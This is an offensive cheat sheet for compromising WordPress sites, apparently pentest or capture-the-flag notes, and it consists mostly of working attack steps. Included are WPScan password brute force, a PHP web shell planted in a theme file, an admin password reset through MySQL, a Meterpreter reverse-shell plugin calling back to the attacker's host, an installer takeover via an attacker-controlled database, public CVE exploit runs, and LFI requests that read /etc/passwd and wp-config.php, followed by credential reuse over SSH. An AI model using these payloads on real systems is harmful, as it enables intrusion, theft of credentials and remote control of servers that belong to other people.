# WordPress

## Discovery

```bash
# Version in meta tag
curl -s http://TARGET | grep 'content="WordPress'

# Version in readme
curl -s http://TARGET/readme.html

# Login page
/wp-login.php
/wp-admin/
```

---

## WPScan Enumeration

```bash
# Enumerate users, vulnerable plugins, and vulnerable themes in one pass
wpscan --url http://TARGET -e u,vp,vt

# Aggressive enumeration for plugins, users, and themes
wpscan --url http://TARGET --enumerate p,u,t --plugins-detection aggressive --no-update
wpscan --url http://TARGET --enumerate ap,u,at --plugins-detection aggressive --no-update


# Enumerate vulnerable plugins
wpscan --url http://TARGET --enumerate vp

# Aggressive plugin detection
wpscan --url http://TARGET --enumerate p --plugins-detection aggressive
```

If you have a plugin wordlist, brute force the plugin directory directly:

```bash
feroxbuster -u http://TARGET/wordpress/wp-content/plugins/ -w /md/wl/wordpress-plugins.txt -t 10 -n
```

Useful hits:

```text
http://TARGET/wordpress/wp-content/plugins/adrotate/
http://TARGET/wordpress/wp-content/plugins/akismet/
```

WordPress REST API can also expose users:

```text
http://TARGET/index.php/wp-json/wp/v2/users/
```

---

## Brute Force (WPScan)

```bash
# XMLRPC method (faster)
wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://TARGET

# wp-login method
wpscan --password-attack wp-login -t 20 -U admin,john -P passwords.txt --url http://TARGET

# With user list file
wpscan --password-attack xmlrpc -U users.txt -P passwords.txt --url http://TARGET
```

---

## Theme Editor RCE (Authenticated)

1. Login as admin
2. `Appearance → Theme Editor`
3. Select inactive theme (e.g., Twenty Nineteen)
4. Edit `404.php`
5. Add web shell:

```php
system($_GET[0]);
```

6. Access: `http://TARGET/wp-content/themes/twentynineteen/404.php?0=id`

---

## Database Admin Password Reset to Plugin Upload

If you have a shell and recover database credentials from `wp-config.php`, use MySQL to reset an existing admin password, then log in and upload a malicious plugin.

```bash
cat /var/www/html/wp-config.php
# define( 'DB_USER', 'karl' );
# define( 'DB_PASSWORD', 'Wordpress1234' );
# define( 'DB_HOST', 'localhost' );

mysql -u karl -h localhost -p
```

```sql
use wordpress;
select ID,user_login,user_pass from wp_users;
UPDATE wp_users SET user_pass = '$P$BOsqjHHIL2M2Q.HnZA5JL/xb9FIb5l1' WHERE user_login = 'admin';
```

The observed hash set the `admin` password to `admin`. After logging in, upload a plugin webshell and trigger it:

```bash
python3 wordpwn.py ATTACKER_IP 80 N
```

```text
http://TARGET/wp-admin/plugin-install.php?tab=upload
http://TARGET/wp-content/plugins/malicious/SWebTheme.php?cmd=whoami
```

Successful shell context may be the web server user, such as `alice`.

---

## Metasploit RCE

```bash
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME john
set PASSWORD firebird1
set RHOSTS TARGET_IP
set VHOST blog.domain.local
set TARGETURI /
run
```

---

## Exposed Installer Takeover

If WordPress is left at `/wp-admin/setup-config.php`, you can sometimes complete the install yourself by making the target connect to a database you control.

Start a throwaway MySQL instance on the attacker box:

```bash
docker run --name wp-mysql -e MYSQL_ROOT_PASSWORD=admin123 -p 3306:3306 -d mysql:latest
mysql -u root -h 127.0.0.1 -padmin123 -e "CREATE DATABASE wordpress;"
```

Fill the setup form with:

```text
Database name: wordpress
Username: root
Password: admin123
Database host: ATTACKER_IP:3306
Table prefix: wp_
```

If the page says the database server was reached but the database could not be selected, create the database name it expects and retry. Once setup succeeds, create the WordPress admin user, log in at `/wp-login.php`, and use theme editor or plugin upload for code execution.

---

## Malicious plugin upload (wordpwn)

When the **Theme Editor** is disabled or PHP changes are reverted (“upload by some other means, such as SFTP”), use a **malicious plugin** instead. You need admin access (e.g. default or brute-forced creds).

**Tool:** [wetw0rk/malicious-wordpress-plugin](https://github.com/wetw0rk/malicious-wordpress-plugin) — generates a plugin zip containing a Meterpreter or webshell payload.

```bash
git clone https://github.com/wetw0rk/malicious-wordpress-plugin.git
cd malicious-wordpress-plugin

# Generate plugin with meterpreter reverse TCP (set LHOST/LPORT)
python3 wordpwn.py LHOST LPORT php/meterpreter/reverse_tcp

# Start listener
msfconsole -q -x "use multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST LHOST; set LPORT LPORT; run"
```

**Upload:** As admin, go to **Plugins → Add New → Upload Plugin** and upload the generated `malicious.zip`.  
**URL:** `http://TARGET/wp-admin/plugin-install.php?tab=upload`

**Activate** the plugin, then trigger the shell:

| Trigger URL |
|-------------|
| `http://TARGET/wp-content/plugins/malicious/wetw0rk_maybe.php` |
| `http://TARGET/wp-content/plugins/malicious/QwertyRocks.php` |
| `http://TARGET/wp-content/plugins/malicious/SWebTheme.php?cmd=COMMAND` |

Use the first or second for Meterpreter; the third runs a single command via `?cmd=`. Shell runs as the web server user (e.g. www-data).

---

## Vulnerable Plugins

### AdRotate Banner Manager authenticated upload RCE

AdRotate Banner Manager versions up to and including `5.13.2` can allow authenticated administrators to upload arbitrary files because `adrotate_insert_media()` does not properly sanitize extensions. On configurations that execute the first extension in a double extension, this can become RCE.

WPScan may identify the plugin and version:

```text
[+] adrotate
 | Location: http://TARGET/wordpress/wp-content/plugins/adrotate/
 | Readme: http://TARGET/wordpress/wp-content/plugins/adrotate/readme.txt
 | Version: 5.8.6.2
```

If the login redirects to a virtual host, add the host before authenticating:

```text
TARGET loly.lc
```

With administrator access, go to the AdRotate media manager:

```text
http://loly.lc/wordpress/wp-admin/admin.php?page=adrotate-media&status=510
```

A zipped PHP shell was accepted and extracted to an executable PHP file:

```bash
mv php-reverse-shell.php shell.php
zip shell.zip shell.php
```

Upload `shell.zip` through the AdRotate media manager, then trigger:

```text
http://loly.lc/wordpress/wp-content/banners/shell.php
```

Successful shell context:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64
```

After getting code execution, read `wp-config.php` for database credentials:

```bash
cat /var/www/html/wordpress/wp-config.php
```

Observed values:

```php
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'lolyisabeautifulgirl');
```

References:

- https://github.com/advisories/GHSA-77x6-hmg8-vxg7
- https://wpscan.com/vulnerability/a670dc87-ed79-493a-888d-afd7cb99269e/

### Simple File List 4.2.2 pre-auth RCE

WordPress **Simple File List** versions around `4.2.2` can be abused for unauthenticated file upload / RCE. This is useful when WPScan finds the plugin under `/wp-content/plugins/simple-file-list/` and the WordPress site has public uploads enabled.

```bash
wpscan --url http://TARGET --enumerate p --plugins-detection aggressive
```

Look for:

```text
[+] simple-file-list
 | Location: http://TARGET/wp-content/plugins/simple-file-list/
 | Version: 4.2.2
```

Uploads commonly land under:

```text
http://TARGET/wp-content/uploads/simple-file-list/
```

Public reference:

* CVE-2025-34085 PoC

```bash
git clone https://github.com/0xgh057r3c0n/CVE-2025-34085.git
cd CVE-2025-34085
python3 CVE-2025-34085.py -u http://TARGET --cmd id
```

Expected output includes the uploaded PHP path:

```text
[DEBUG] Command Output:
uid=33(http) gid=33(http) groups=33(http)

[+] http://TARGET | http://TARGET/wp-content/uploads/simple-file-list/RANDOM.php
```

Use the webshell directly and read WordPress config for credential reuse:

```bash
curl 'http://TARGET/wp-content/uploads/simple-file-list/RANDOM.php?cmd=id'
curl 'http://TARGET/wp-content/uploads/simple-file-list/RANDOM.php?cmd=cat%20../../../wp-config.php'
```

High-value values:

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'username');
define('DB_PASSWORD', 'password');
define('DB_HOST', 'localhost');
```

If the DB username also exists as a system user, try SSH with the database password:

```bash
ssh username@TARGET
```

### Tutor LMS authenticated issues

Tutor LMS old versions, such as `1.5.3`, may have authenticated attack paths. Check registration first; if registration is disabled, you need existing credentials before using authenticated PoCs.

```bash
python3 exploit-cve-2024-3553-v2.py http://TARGET --check-only
```

Useful references:

* CVE-2024-10400: `https://github.com/k0ns0l/CVE-2024-10400`
* CVE-2024-3553: `https://github.com/RandomRobbieBF/CVE-2024-3553`

### mail-masta LFI (unauthenticated)

```bash
curl http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

**Full exploitation walkthrough:**

1. Confirm LFI by reading `/etc/passwd`:

```bash
curl 'http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'
```

2. Read Apache config to find the document root:

```bash
curl 'http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/apache2.conf'
# Look for: <Directory /var/www/>
```

3. Read files from the discovered webroot:

```bash
curl 'http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/flag.txt'
```

There is also a Python exploit script on Exploit-DB (`mail-masta.py`) that automates fuzzing for files via this LFI. The original script has bugs — the fixed version uses a try/except fallback to manually read `/etc/passwd` if the wordlist is missing:

```python
except:
    response = requests.get(target + endpoint + "/etc/passwd")
    if len(response.content) > 500:
        print(response.content)
    else:
        print("likely failed, confirm manually with: curl http://<target>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd")
```

### Site Editor 1.1.1 LFI (CVE-2018-7422)

WordPress Plugin **Site Editor 1.1.1** exposes an unauthenticated LFI through `ajax_shortcode_pattern.php`.

```bash
searchsploit wordpress site editor
searchsploit -m php/webapps/44340.txt
```

Confirm by reading `/etc/passwd`:

```text
http://TARGET/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

Useful follow-on files:

```text
/proc/sched_debug
/proc/mounts
/etc/redis/redis.conf
```

`/etc/redis/redis.conf` can expose `requirepass`, which can lead to authenticated Redis RCE.

### wpDiscuz RCE (CVE-2020-24186)

```bash
python3 wp_discuz.py -u http://TARGET -p /?p=1

# If exploit fails, use uploaded webshell
curl http://TARGET/wp-content/uploads/2021/08/SHELL.php?cmd=id
```

---

## Important Paths

| Path | Description |
|------|-------------|
| `/wp-config.php` | DB credentials |
| `/wp-content/uploads/` | Uploaded files |
| `/wp-content/plugins/` | Plugins |
| `/wp-content/themes/` | Themes |
| `/xmlrpc.php` | XML-RPC API |

---

## Config File Locations

```bash
# Linux
/var/www/html/wp-config.php
/var/www/wordpress/wp-config.php

# Database creds in wp-config.php
define('DB_NAME', 'database_name');
define('DB_USER', 'username');
define('DB_PASSWORD', 'password');
define('DB_HOST', 'localhost');
```

